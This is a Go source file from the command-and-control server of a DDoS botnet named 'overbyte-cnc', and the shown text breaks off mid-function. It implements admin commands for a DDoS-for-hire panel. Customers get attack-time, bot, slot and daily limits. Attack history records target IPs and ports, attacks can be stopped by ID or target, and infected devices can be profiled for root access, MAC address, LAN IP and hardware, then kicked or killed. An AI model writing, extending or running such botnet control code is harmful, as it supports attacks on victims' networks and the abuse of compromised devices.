package cnc

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"overbyte-cnc/database"
	"overbyte-cnc/logger"
	"overbyte-cnc/theme"
)

func (s *Session) handleAddUser(args []string) {
	t := theme.Current()
	s.writeLine("")
	s.writeLine(t.Label("Add New User"))
	s.writeLine(t.Hint("(Enter 0 or 'u' for unlimited)"))
	s.writeLine("")

	username, err := s.readSimpleLine(t.Label("Username") + " ")
	if err != nil || username == "" {
		s.writeLine(t.Hint("Cancelled"))
		return
	}

	maxTimeStr, err := s.readSimpleLine(t.Label("Max Attack Time (0 = unlimited)") + " ")
	if err != nil {
		s.writeLine(t.Hint("Cancelled"))
		return
	}
	maxTime := s.parseUnlimitedInt(maxTimeStr, s.cfg.Defaults.MaxTime)

	maxBotsStr, err := s.readSimpleLine(t.Label("Max Bots (0 = unlimited)") + " ")
	if err != nil {
		s.writeLine(t.Hint("Cancelled"))
		return
	}
	maxBots := s.parseUnlimitedInt(maxBotsStr, s.cfg.Defaults.MaxBots)

	maxSlotsStr, err := s.readSimpleLine(t.Label("Max Slots (0 = unlimited)") + " ")
	if err != nil {
		s.writeLine(t.Hint("Cancelled"))
		return
	}
	maxSlots := s.parseUnlimitedInt(maxSlotsStr, s.cfg.Defaults.MaxSlots)

	dailyLimitStr, err := s.readSimpleLine(t.Label("Daily Limit (0 = unlimited)") + " ")
	if err != nil {
		s.writeLine(t.Hint("Cancelled"))
		return
	}
	dailyLimit := s.parseUnlimitedInt(dailyLimitStr, s.cfg.Defaults.DailyLimit)

	apiAccessStr, err := s.readSimpleLine(t.Label("Enable API Access? (y/n)") + " ")
	if err != nil {
		s.writeLine(t.Hint("Cancelled"))
		return
	}
	apiAccess := strings.ToLower(apiAccessStr) == "y" || strings.ToLower(apiAccessStr) == "yes"

	isAdminStr, err := s.readSimpleLine(t.Label("Is this user an admin? (y/n)") + " ")
	if err != nil {
		s.writeLine(t.Hint("Cancelled"))
		return
	}
	role := "user"
	if strings.ToLower(isAdminStr) == "y" || strings.ToLower(isAdminStr) == "yes" {
		role = "admin"
	}

	expiryStr, err := s.readSimpleLine(t.Label("Expiry date (YYYY-MM-DD or empty for never)") + " ")
	if err != nil {
		s.writeLine(t.Hint("Cancelled"))
		return
	}
	var expiryDate *time.Time
	if expiryStr != "" {
		parsed, parseErr := time.Parse("2006-01-02", expiryStr)
		if parseErr != nil {
			s.writeLine(t.WarningMsg("Warning", "Invalid date format, setting to never"))
		} else {
			expiryDate = &parsed
		}
	}

	password, apiKey, err := s.db.CreateUser(username, maxTime, maxBots, maxSlots, dailyLimit, apiAccess, role, expiryDate)
	if err != nil {
		s.writeLine(t.ErrorMsg(fmt.Sprintf("Failed creating user: %v", err)))
		return
	}

	s.writeLine("")
	s.writeLine(t.Succ("[*] User Created"))
	s.writeLine(t.LabelValue("    Username", username))
	s.writeLine(t.LabelValue("    Password", t.Err(password)))
	if apiAccess {
		s.writeLine(t.LabelValue("    API Key", t.Inf(apiKey)))
	}
	s.writeLine(t.LabelValue("    Role", role))
	s.writeLine(t.LabelValue("    Max Time", s.formatLimit(maxTime)))
	s.writeLine(t.LabelValue("    Max Bots", s.formatLimit(maxBots)))
	s.writeLine(t.LabelValue("    Max Slots", s.formatLimit(maxSlots)))
	s.writeLine(t.LabelValue("    Daily", s.formatLimit(dailyLimit)))
	s.writeLine(t.LabelValue("    API Access", strconv.FormatBool(apiAccess)))
	if expiryDate != nil {
		s.writeLine(t.LabelValue("    Expiry", expiryDate.Format("2006-01-02")))
	} else {
		s.writeLine(t.LabelValue("    Expiry", "never"))
	}
	s.writeLine(t.Err("    Password shown ONCE! User must change on first login."))
	if apiAccess {
		s.writeLine(t.Err("    API Key shown ONCE! Save it securely."))
	}
	s.writeLine("")

	logger.LogUserAction(s.user.Username, fmt.Sprintf("adduser %s role=%s api_access=%v", username, role, apiAccess))
}

func (s *Session) handleDelUser(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!deluser", "<username>"))
		return
	}

	username := args[0]
	err := s.db.DeleteUser(username)
	if err != nil {
		s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
		return
	}

	s.writeLine(t.Succ(fmt.Sprintf("User '%s' deleted successfully", username)))
	logger.LogUserAction(s.user.Username, fmt.Sprintf("deluser %s", username))
}

func (s *Session) handleEditUser(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!edituser", "<username>"))
		return
	}

	username := args[0]
	user, err := s.db.GetUserDetails(username)
	if err != nil {
		s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
		return
	}

	for {
		s.writeLine("")
		s.writeLine(t.LabelValue("Edit User", fmt.Sprintf("%s (Role: %s)", user.Username, user.Role)))
		s.writeLine(t.Hint("(Enter 0 or 'u' for unlimited)"))
		s.writeLine("")
		s.writeLine(t.LabelValue("  [1] Username", user.Username))
		s.writeLine(t.LabelValue("  [2] Max Time", s.formatLimit(user.MaxTime)))
		s.writeLine(t.LabelValue("  [3] Max Bots", s.formatLimit(user.MaxBots)))
		s.writeLine(t.LabelValue("  [4] Max Slots", s.formatLimit(user.MaxSlots)))
		s.writeLine(t.LabelValue("  [5] Daily Limit", s.formatLimit(user.DailyLimit)))
		apiStatus := "disabled"
		if user.APIAccess {
			apiStatus = "enabled"
		}
		s.writeLine(t.LabelValue("  [6] API Access", apiStatus))
		s.writeLine(t.LabelValue("  [7] Role", user.Role))
		expiryStr := "never"
		if user.ExpiryDate.Valid {
			expiryStr = user.ExpiryDate.Time.Format("2006-01-02")
		}
		s.writeLine(t.LabelValue("  [8] Expiry Date", expiryStr))
		s.writeLine("")
		s.writeLine(t.Inf("  [0] Back"))
		s.writeLine("")

		choice, err := s.readSimpleLine(t.Label("Select option") + ": ")
		if err != nil {
			return
		}

		switch choice {
		case "0":
			return
		case "1":
			newUsername, err := s.readSimpleLine(t.Label("New username") + ": ")
			if err != nil || newUsername == "" {
				s.writeLine(t.Hint("Cancelled"))
				continue
			}
			if err := s.db.UpdateUsername(user.Username, newUsername); err != nil {
				s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
			} else {
				logger.LogUserAction(s.user.Username, fmt.Sprintf("edituser %s: username -> %s", user.Username, newUsername))
				user.Username = newUsername
				username = newUsername
				s.writeLine(t.Succ("Username updated"))
			}
		case "2":
			input, err := s.readSimpleLine(t.Label("New Max Time (0 = unlimited)") + ": ")
			if err != nil {
				s.writeLine(t.Hint("Cancelled"))
				continue
			}
			val := s.parseUnlimitedInt(input, user.MaxTime)
			if err := s.db.UpdateUserMaxTime(username, val); err != nil {
				s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
			} else {
				user.MaxTime = val
				s.writeLine(t.LabelValue("Max Time set to", s.formatLimit(val)))
				logger.LogUserAction(s.user.Username, fmt.Sprintf("edituser %s: max_time -> %d", username, val))
			}
		case "3":
			input, err := s.readSimpleLine(t.Label("New Max Bots (0 = unlimited)") + ": ")
			if err != nil {
				s.writeLine(t.Hint("Cancelled"))
				continue
			}
			val := s.parseUnlimitedInt(input, user.MaxBots)
			if err := s.db.UpdateUserMaxBots(username, val); err != nil {
				s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
			} else {
				user.MaxBots = val
				s.writeLine(t.LabelValue("Max Bots set to", s.formatLimit(val)))
				logger.LogUserAction(s.user.Username, fmt.Sprintf("edituser %s: max_bots -> %d", username, val))
			}
		case "4":
			input, err := s.readSimpleLine(t.Label("New Max Slots (0 = unlimited)") + ": ")
			if err != nil {
				s.writeLine(t.Hint("Cancelled"))
				continue
			}
			val := s.parseUnlimitedInt(input, user.MaxSlots)
			if err := s.db.UpdateUserMaxSlots(username, val); err != nil {
				s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
			} else {
				user.MaxSlots = val
				s.writeLine(t.LabelValue("Max Slots set to", s.formatLimit(val)))
				logger.LogUserAction(s.user.Username, fmt.Sprintf("edituser %s: max_slots -> %d", username, val))
			}
		case "5":
			input, err := s.readSimpleLine(t.Label("New Daily Limit (0 = unlimited)") + ": ")
			if err != nil {
				s.writeLine(t.Hint("Cancelled"))
				continue
			}
			val := s.parseUnlimitedInt(input, user.DailyLimit)
			if err := s.db.UpdateUserDailyLimit(username, val); err != nil {
				s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
			} else {
				user.DailyLimit = val
				s.writeLine(t.Succ("Daily Limit set to " + s.formatLimit(val)))
				logger.LogUserAction(s.user.Username, fmt.Sprintf("edituser %s: daily_limit -> %d", username, val))
			}
		case "6":
			input, err := s.readSimpleLine(t.Label("Enable API Access? (y/n)") + ": ")
			if err != nil {
				s.writeLine(t.Hint("Cancelled"))
				continue
			}
			enable := strings.ToLower(input) == "y" || strings.ToLower(input) == "yes"
			if err := s.db.UpdateUserAPIAccess(username, enable); err != nil {
				s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
			} else {
				user.APIAccess = enable
				if enable {
					s.writeLine(t.Succ("API Access enabled (new key generated)"))
				} else {
					s.writeLine(t.Succ("API Access disabled"))
				}
				logger.LogUserAction(s.user.Username, fmt.Sprintf("edituser %s: api_access -> %v", username, enable))
			}
		case "7":
			input, err := s.readSimpleLine(t.Label("New Role (user/admin)") + ": ")
			if err != nil {
				s.writeLine(t.Hint("Cancelled"))
				continue
			}
			role := strings.ToLower(strings.TrimSpace(input))
			if role != "user" && role != "admin" {
				s.writeLine(t.WarningMsg("Input", "Invalid role. Must be 'user' or 'admin'"))
				continue
			}
			if err := s.db.UpdateUserRole(username, role); err != nil {
				s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
			} else {
				user.Role = role
				s.writeLine(t.Succ("Role set to " + role))
				logger.LogUserAction(s.user.Username, fmt.Sprintf("edituser %s: role -> %s", username, role))
			}
		case "8":
			input, err := s.readSimpleLine(t.Label("Expiry date (YYYY-MM-DD or empty for never)") + ": ")
			if err != nil {
				s.writeLine(t.Hint("Cancelled"))
				continue
			}
			var expiryDate *time.Time
			if input != "" {
				parsed, parseErr := time.Parse("2006-01-02", input)
				if parseErr != nil {
					s.writeLine(t.WarningMsg("Input", "Invalid date format"))
					continue
				}
				expiryDate = &parsed
			}
			if err := s.db.UpdateUserExpiry(username, expiryDate); err != nil {
				s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
			} else {
				if expiryDate != nil {
					user.ExpiryDate.Time = *expiryDate
					user.ExpiryDate.Valid = true
					s.writeLine(t.LabelValue("Expiry set to", expiryDate.Format("2006-01-02")))
				} else {
					user.ExpiryDate.Valid = false
					s.writeLine(t.Succ("Expiry set to never"))
				}
				logger.LogUserAction(s.user.Username, fmt.Sprintf("edituser %s: expiry_date updated", username))
			}
		default:
			s.writeLine(t.WarningMsg("Input", "Invalid option"))
		}
	}
}

func (s *Session) handleUserInfo(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!userinfo", "<username>"))
		return
	}

	username := args[0]
	user, err := s.db.GetUserDetails(username)
	if err != nil {
		s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
		return
	}

	s.writeLine("")
	s.writeLine(t.LabelValue("User Information", user.Username))
	s.writeLine("")
	s.writeLine(t.LabelValue("  ID", fmt.Sprintf("%d", user.ID)))
	s.writeLine(t.LabelValue("  Username", user.Username))
	s.writeLine(t.LabelValue("  Role", user.Role))
	s.writeLine(t.LabelValue("  Max Time", s.formatLimit(user.MaxTime)))
	s.writeLine(t.LabelValue("  Max Bots", s.formatLimit(user.MaxBots)))
	s.writeLine(t.LabelValue("  Max Slots", s.formatLimit(user.MaxSlots)))
	s.writeLine(t.LabelValue("  Daily Limit", s.formatLimit(user.DailyLimit)))
	s.writeLine(t.LabelValue("  Daily Used", fmt.Sprintf("%d", user.DailyUsed)))

	apiStatus := "disabled"
	if user.APIAccess {
		apiStatus = "enabled"
	}
	s.writeLine(t.LabelValue("  API Access", apiStatus))

	bannedStatus := "no"
	if user.Banned {
		bannedStatus = t.Label("yes")
	}
	s.writeLine(t.LabelValue("  Banned", bannedStatus))

	expiryStr := "never"
	if user.ExpiryDate.Valid {
		expiryStr = user.ExpiryDate.Time.Format("2006-01-02")
	}
	s.writeLine(t.LabelValue("  Expiry Date", expiryStr))
	s.writeLine("")
}

func (s *Session) handleResetPass(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!resetpass", "<username>"))
		return
	}

	username := args[0]
	newPassword, err := s.db.ResetUserPassword(username)
	if err != nil {
		s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
		return
	}

	s.writeLine("")
	s.writeLine(t.Succ("[*] Password Reset for '" + username + "'"))
	s.writeLine(t.LabelValue("    New Password", t.Err(newPassword)))
	s.writeLine(t.Err("    Password shown ONCE! User must change on first login."))
	s.writeLine("")

	logger.LogUserAction(s.user.Username, fmt.Sprintf("resetpass %s", username))
}

func (s *Session) handleUptime() {
	t := theme.Current()
	uptime := s.server.GetUptime()
	days := int(uptime.Hours()) / 24
	hours := int(uptime.Hours()) % 24
	minutes := int(uptime.Minutes()) % 60
	seconds := int(uptime.Seconds()) % 60

	s.writeLine(t.LabelValue("CNC Uptime", fmt.Sprintf("%dd %dh %dm %ds", days, hours, minutes, seconds)))
}

func (s *Session) handlePasswd() {
	t := theme.Current()
	s.writeLine("")
	currentPass, err := s.readPasswordInput(t.Label("Current Password") + ": ")
	if err != nil {
		s.writeLine(t.Hint("Cancelled"))
		return
	}

	user, err := s.db.AuthenticateUser(s.user.Username, currentPass)
	if err != nil || user == nil {
		s.writeLine(t.WarningMsg("Auth", "Incorrect password"))
		return
	}

	newPass, err := s.readPasswordInput(t.Label("New Password") + ": ")
	if err != nil || newPass == "" {
		s.writeLine(t.Hint("Cancelled"))
		return
	}

	confirmPass, err := s.readPasswordInput(t.Label("Confirm Password") + ": ")
	if err != nil {
		s.writeLine(t.Hint("Cancelled"))
		return
	}

	if newPass != confirmPass {
		s.writeLine(t.WarningMsg("Input", "Passwords do not match"))
		return
	}

	if len(newPass) < 6 {
		s.writeLine(t.WarningMsg("Input", "Password must be at least 6 characters"))
		return
	}

	if err := s.db.UpdateUserPassword(s.user.ID, newPass); err != nil {
		s.writeLine(t.ErrorMsg("Failed to update password"))
		return
	}

	s.writeLine(t.Succ("Password changed successfully!"))
	logger.LogUserAction(s.user.Username, "password_changed")
}

func (s *Session) handleLastLogin() {
	t := theme.Current()
	record, err := s.db.GetLastLogin(s.user.ID)
	if err != nil {
		s.writeLine(t.ErrorMsg("Failed fetching login history"))
		return
	}

	if record == nil {
		s.writeLine(t.Inf("No previous login found"))
		return
	}

	s.writeLine(t.LabelValue("Last Login", fmt.Sprintf("%s from %s", record.LoginTime.Format("2006-01-02 15:04:05"), record.IP)))
}

func (s *Session) handleLogs(args []string) {
	t := theme.Current()
	n := 20
	if len(args) > 0 {
		if parsed, err := strconv.Atoi(args[0]); err == nil && parsed > 0 {
			n = parsed
		}
	}

	if n > 100 {
		n = 100
	}

	logs := logger.GetRecentLogs(n)
	if len(logs) == 0 {
		s.writeLine(t.Inf("No logs available"))
		return
	}

	s.writeLine(t.Label(fmt.Sprintf("Recent %d Logs:", len(logs))))
	s.writeLine("")
	for _, log := range logs {
		s.writeLine("  " + t.Inf(log))
	}
}

func (s *Session) handleSessions() {
	t := theme.Current()
	sessions := s.server.GetAllSessions()
	if len(sessions) == 0 {
		s.writeLine(t.Inf("No active sessions"))
		return
	}

	widths := []int{20, 25, 15}
	rows := make([][]string, 0, len(sessions))
	for _, sess := range sessions {
		duration := time.Since(sess.Connected).Truncate(time.Second)
		rows = append(rows, []string{sess.Username, sess.RemoteIP, duration.String()})
	}
	s.rl.Write([]byte(RenderTable([]string{"Username", "Remote IP", "Connected"}, rows, widths, t)))
}

func (s *Session) handleKickUser(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!kickuser", "<username>"))
		return
	}

	username := args[0]
	if username == s.user.Username {
		s.writeLine(t.WarningMsg("Input", "Cannot kick yourself"))
		return
	}

	targetUser, err := s.db.GetUserDetails(username)
	if err != nil {
		s.writeLine(t.Inf(fmt.Sprintf("User '%s' not found", username)))
		return
	}

	if targetUser.Role == "root" {
		s.writeLine(t.WarningMsg("Permission Denied", "Cannot kick root user"))
		return
	}

	count := s.server.KickUserByUsername(username)
	if count == 0 {
		s.writeLine(t.Inf(fmt.Sprintf("User '%s' is not online", username)))
		return
	}

	s.writeLine(t.Succ(fmt.Sprintf("Kicked %d session(s) for user '%s'", count, username)))
	logger.LogUserAction(s.user.Username, fmt.Sprintf("kick_user %s", username))
}

func (s *Session) handleBanUser(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!ban", "<username>"))
		return
	}

	username := args[0]
	if err := s.db.BanUser(username); err != nil {
		s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
		return
	}

	s.server.KickUserByUsername(username)

	s.writeLine(t.Succ(fmt.Sprintf("User '%s' has been banned", username)))
	logger.LogUserAction(s.user.Username, fmt.Sprintf("ban_user %s", username))
}

func (s *Session) handleUnbanUser(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!unban", "<username>"))
		return
	}

	username := args[0]
	if err := s.db.UnbanUser(username); err != nil {
		s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
		return
	}

	s.writeLine(t.Succ(fmt.Sprintf("User '%s' has been unbanned", username)))
	logger.LogUserAction(s.user.Username, fmt.Sprintf("unban_user %s", username))
}

func (s *Session) handleHistory(args []string) {
	t := theme.Current()
	n := 10
	if len(args) > 0 {
		if parsed, err := strconv.Atoi(args[0]); err == nil && parsed > 0 {
			n = parsed
		}
	}

	if n > 50 {
		n = 50
	}

	var attacks []database.Attack
	var err error

	if s.isAdmin() {
		attacks, err = s.db.GetAllAttackHistory(n)
	} else {
		attacks, err = s.db.GetAttackHistory(s.user.ID, n)
	}

	if err != nil {
		s.writeLine(t.ErrorMsg("Failed fetching history"))
		return
	}

	if len(attacks) == 0 {
		s.writeLine(t.Inf("No attack history"))
		return
	}

	rows := make([][]string, 0, len(attacks))
	for _, a := range attacks {
		portStr := "-"
		if a.TargetPort > 0 {
			portStr = strconv.Itoa(a.TargetPort)
		}
		row := []string{
			strconv.Itoa(a.ID),
			a.Method,
			a.TargetIP,
			portStr,
			strconv.Itoa(a.Duration),
			a.Status,
		}
		if s.isAdmin() {
			row = append(row, a.Username)
		}
		rows = append(rows, row)
	}
	if s.isAdmin() {
		s.rl.Write([]byte(RenderTable([]string{"ID", "Method", "Target", "Port", "Dur", "Status", "User"}, rows, []int{6, 10, 18, 7, 6, 8, 12}, t)))
	} else {
		s.rl.Write([]byte(RenderTable([]string{"ID", "Method", "Target", "Port", "Dur", "Status"}, rows, []int{6, 10, 18, 7, 6, 10}, t)))
	}
}

func (s *Session) handleStopAttack(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!stopatk", "<all|attack_id>"))
		return
	}

	if strings.ToLower(args[0]) == "all" {
		_ = s.botManager.SendStopAll()
		stopped, _ := s.db.StopAllRunningAttacks()
		s.writeLine(t.SuccMsg(fmt.Sprintf("All attacks stopped (%d slots freed)", stopped)))
		logger.LogUserAction(s.user.Username, "stop_all_attacks")
		return
	}

	attackID, err := strconv.ParseInt(args[0], 10, 64)
	if err != nil {
		s.writeLine(t.WarningMsg("Input", "Invalid attack ID"))
		return
	}

	atk, err := s.db.GetAttackByID(attackID)
	if err != nil || atk == nil {
		s.writeLine(t.WarningMsg("NotFound", "Attack not found"))
		return
	}

	if err := s.db.StopAttackByID(attackID, s.user.ID, s.isAdmin()); err != nil {
		s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
		return
	}

	_ = s.botManager.SendStopTarget(atk.TargetIP)
	s.db.StopAttacksByTargetIP(atk.TargetIP)

	s.writeLine(t.SuccMsg(fmt.Sprintf("Stopped attack id %d (+ all attacks on %s)", attackID, atk.TargetIP)))
	logger.LogUserAction(s.user.Username, fmt.Sprintf("stop_attack %d target=%s", attackID, atk.TargetIP))
}

func (s *Session) handleBlacklist(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!blacklist", "<add|remove|list> [ip]"))
		return
	}

	action := strings.ToLower(args[0])

	switch action {
	case "list":
		entries, err := s.db.GetBlacklist()
		if err != nil {
			s.writeLine(t.ErrorMsg("Failed fetching blacklist"))
			return
		}

		if len(entries) == 0 {
			s.writeLine(t.Inf("Blacklist is empty"))
			return
		}

		widths := []int{20, 15, 20}
		rows := make([][]string, 0, len(entries))
		for _, e := range entries {
			rows = append(rows, []string{e.IP, e.AddedBy, e.AddedAt.Format("2006-01-02 15:04")})
		}
		s.rl.Write([]byte(RenderTable([]string{"IP", "Added By", "Added At"}, rows, widths, t)))

	case "add":
		if len(args) < 2 {
			s.writeLine(t.UsageMsg("!blacklist add", "<ip>"))
			return
		}
		ip := args[1]
		if err := s.db.AddBlacklistIP(ip, s.user.Username); err != nil {
			s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
			return
		}
		s.writeLine(t.Succ(fmt.Sprintf("Added %s to blacklist", ip)))
		logger.LogUserAction(s.user.Username, fmt.Sprintf("blacklist_add %s", ip))

	case "remove":
		if len(args) < 2 {
			s.writeLine(t.UsageMsg("!blacklist remove", "<ip>"))
			return
		}
		ip := args[1]
		if err := s.db.RemoveBlacklistIP(ip); err != nil {
			s.writeLine(t.ErrorMsg(fmt.Sprintf("%v", err)))
			return
		}
		s.writeLine(t.Succ(fmt.Sprintf("Removed %s from blacklist", ip)))
		logger.LogUserAction(s.user.Username, fmt.Sprintf("blacklist_remove %s", ip))

	default:
		s.writeLine(t.UsageMsg("!blacklist", "<add|remove|list> [ip]"))
	}
}

func (s *Session) handleBotStats() {
	t := theme.Current()
	stats := s.botManager.GetBotStats()

	s.writeLine("")
	s.writeLine(t.Label("Bot Statistics:"))
	s.writeLine(t.LabelValue("  Total Bots", fmt.Sprintf("%d", stats.TotalBots)))

	if stats.TotalBots > 0 {
		avgMins := int(stats.AvgUptime / 60)
		s.writeLine(t.LabelValue("  Avg Uptime", fmt.Sprintf("%d minutes", avgMins)))
		s.writeLine(t.LabelValue("  Oldest Bot", stats.OldestBot.Truncate(time.Second).String()))
		s.writeLine(t.LabelValue("  Newest Bot", stats.NewestBot.Truncate(time.Second).String()))

		if len(stats.ArchCounts) > 0 {
			s.writeLine(t.Label("  By Architecture:"))
			for arch, count := range stats.ArchCounts {
				pct := float64(count) / float64(stats.TotalBots) * 100
				s.writeLine(t.LabelValue("    "+truncateDisplay(arch, 12), fmt.Sprintf("%d (%.1f%%)", count, pct)))
			}
		}
	}
	s.writeLine("")
}

func (s *Session) handleBotInfo(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!botinfo", "<ip>"))
		return
	}

	ip := args[0]
	bot := s.botManager.GetBotByIP(ip)
	if bot == nil {
		s.writeLine(t.WarningMsg("Bot", fmt.Sprintf("Bot with IP '%s' not found", ip)))
		return
	}

	s.writeLine(t.Hint("Requesting system info..."))
	previousInfoTime := bot.SysInfoTime
	s.botManager.RequestSysInfo(bot.ID)

	timeout := time.After(5 * time.Second)
	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()

	infoReceived := false
	for !infoReceived {
		select {
		case <-timeout:
			s.writeLine(t.WarningMsg("Timeout", "Bot did not respond in time, showing cached info"))
			infoReceived = true
		case <-ticker.C:
			bot = s.botManager.GetBotByIP(ip)
			if bot == nil {
				s.writeLine(t.WarningMsg("Bot", "Bot disconnected"))
				return
			}
			if !bot.SysInfoTime.Equal(previousInfoTime) && !bot.SysInfoTime.IsZero() {
				infoReceived = true
			}
		}
	}

	bot = s.botManager.GetBotByIP(ip)
	if bot == nil {
		s.writeLine(t.WarningMsg("Bot", "Bot disconnected"))
		return
	}

	h := fmt.Sprintf("\033[%sm", t.Primary)
	v := fmt.Sprintf("\033[%sm", t.Secondary)
	d := fmt.Sprintf("\033[%sm", t.Separator)
	r := "\033[0m"
	sep := d + strings.Repeat("\u2500", 56) + r

	lv := func(label string, val string) string {
		return fmt.Sprintf("  %s%-11s%s: %s%-24s%s", h, label, d, v, truncateDisplay(val, 24), r)
	}

	lv2 := func(l1, v1, l2, v2 string) string {
		return fmt.Sprintf("  %s%-11s%s: %s%-20s %s%-8s%s: %s%-20s%s",
			h, l1, d, v, truncateDisplay(v1, 20), h, l2, d, v, truncateDisplay(v2, 20), r)
	}

	arch := bot.Arch
	if arch == "" {
		arch = "unknown"
	}

	hostname := bot.Hostname
	if hostname == "" {
		hostname = "-"
	}

	deviceType := bot.DeviceType
	if deviceType == "" {
		deviceType = "Unknown"
	}

	rootStr := "No"
	if bot.IsRoot {
		rootStr = "Yes"
	}

	osName := bot.OSName
	if osName == "" {
		osName = "Linux"
	}

	kernelStr := bot.Kernel
	if kernelStr == "" {
		kernelStr = "-"
	}

	cpuModel := bot.CPUModel
	if cpuModel == "" {
		cpuModel = "-"
	}

	uptimeStr := "-"
	if bot.SystemUptime > 0 {
		days := bot.SystemUptime / 86400
		hours := (bot.SystemUptime % 86400) / 3600
		mins := (bot.SystemUptime % 3600) / 60
		uptimeStr = fmt.Sprintf("%dd %dh %dm", days, hours, mins)
	}

	botUptime := time.Since(bot.Connected).Truncate(time.Second)

	uuid := bot.Fingerprint
	if uuid == "" {
		uuid = "-"
	}

	mac := bot.MACAddress
	if mac == "" {
		mac = "-"
	}

	ipAddr := bot.IPAddress
	if ipAddr == "" {
		ipAddr = "-"
	}

	archName := bot.ArchName
	if archName == "" {
		archName = arch
	}

	s.writeLine("")
	s.writeLine(fmt.Sprintf(" %sBot Information: %s%s%s", h, v, truncateDisplay(bot.Addr, 40), r))
	s.writeLine(sep)

	s.writeLine(fmt.Sprintf(" %sIdentity%s", h, r))
	s.writeLine(lv2("Address", bot.Addr, "Arch", archName))
	s.writeLine(lv2("Hostname", hostname, "UUID", uuid))
	s.writeLine(lv2("Device", deviceType, "Root", rootStr))
	if mac != "-" || ipAddr != "-" {
		s.writeLine(lv2("LAN IP", ipAddr, "MAC", mac))
	}

	s.writeLine("")
	s.writeLine(fmt.Sprintf(" %sHardware%s", h, r))
	cpuStr := fmt.Sprintf("%s (%d cores)", cpuModel, bot.CPUCores)
	if len(cpuStr) > 42 {
		cpuStr = fmt.Sprintf("%d cores", bot.CPUCores)
	}
	s.writeLine(lv("CPU", cpuStr))

	if bot.TotalRAM > 0 {
		pct := float64(bot.FreeRAM) / float64(bot.TotalRAM) * 100
		ramStr := fmt.Sprintf("%d/%d MB (%.0f%% free)", bot.FreeRAM, bot.TotalRAM, pct)
		s.writeLine(lv("RAM", ramStr))
	}

	if bot.TotalDisk > 0 {
		diskStr := fmt.Sprintf("%d/%d MB free", bot.FreeDisk, bot.TotalDisk)
		s.writeLine(lv("Disk", diskStr))
	}

	if bot.SwapTotal > 0 {
		s.writeLine(lv("Swap", fmt.Sprintf("%d MB", bot.SwapTotal)))
	}

	s.writeLine("")
	s.writeLine(fmt.Sprintf(" %sSystem%s", h, r))
	s.writeLine(lv2("OS", osName, "Kernel", kernelStr))
	s.writeLine(lv2("Uptime", uptimeStr, "Load", fmt.Sprintf("%.2f/%.2f/%.2f", bot.LoadAvg1, bot.LoadAvg5, bot.LoadAvg15)))

	statsLine := fmt.Sprintf("  %sProcs%s: %s%-5d %sIFs%s: %s%-3d %sPorts%s: %s%-4d %sFDs%s: %s%d%s",
		h, d, v, bot.ProcessCount,
		h, d, v, bot.NetInterfaces,
		h, d, v, bot.OpenPorts,
		h, d, v, bot.OpenFDCount, r)
	s.writeLine(statsLine)

	s.writeLine("")
	s.writeLine(fmt.Sprintf(" %sConnection%s", h, r))
	s.writeLine(lv2("Connected", bot.Connected.Format("2006-01-02 15:04"), "Bot Up", botUptime.String()))

	if !bot.SysInfoTime.IsZero() {
		s.writeLine(lv("Info Time", bot.SysInfoTime.Format("15:04:05")))
	}

	s.writeLine(sep)
	s.writeLine("")
}

func (s *Session) handleKickBot(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!kickbot", "<ip>"))
		return
	}

	ip := args[0]
	if s.botManager.KickBot(ip) {
		s.writeLine(t.Succ(fmt.Sprintf("Bot %s kicked", ip)))
		logger.LogUserAction(s.user.Username, fmt.Sprintf("kick_bot %s", ip))
	} else {
		s.writeLine(t.Inf(fmt.Sprintf("Bot with IP '%s' not found", ip)))
	}
}

func (s *Session) handleKickBots() {
	t := theme.Current()
	count := s.botManager.KickAllBots()
	s.writeLine(t.Succ(fmt.Sprintf("Kicked %d bots", count)))
	logger.LogUserAction(s.user.Username, fmt.Sprintf("kick_all_bots count=%d", count))
}

func (s *Session) handleKillBotCmd(args []string) {
	t := theme.Current()
	if len(args) < 1 {
		s.writeLine(t.UsageMsg("!killbot", "<ip|all>"))
		return
	}

	target := args[0]

	if strings.ToLower(target) == "all" {
		count := s.botManager.KillAllBots()
		s.writeLine(t.Succ(fmt.Sprintf("Kill command sent to %d bots", count)))
		logger.LogUserAction(s.user.Username, fmt.Sprintf("kill_all_bots count=%d", count))
		return
	}

	bot := s.botManager.GetBotByIP(target)
	if bot == nil {
		s.writeLine(t.WarningMsg("Bot", fmt.Sprintf("Bot with IP '%s' not found", target)))
		return
	}

	if err := s.botManager.KillAndRemoveBot(bot.ID); err != nil {
		s.writeLine(t.ErrorMsg(fmt.Sprintf("Failed to kill bot: %v", err)))
		return
	}

	s.writeLine(t.Succ(fmt.Sprintf("Kill command sent to bot %s", target)))
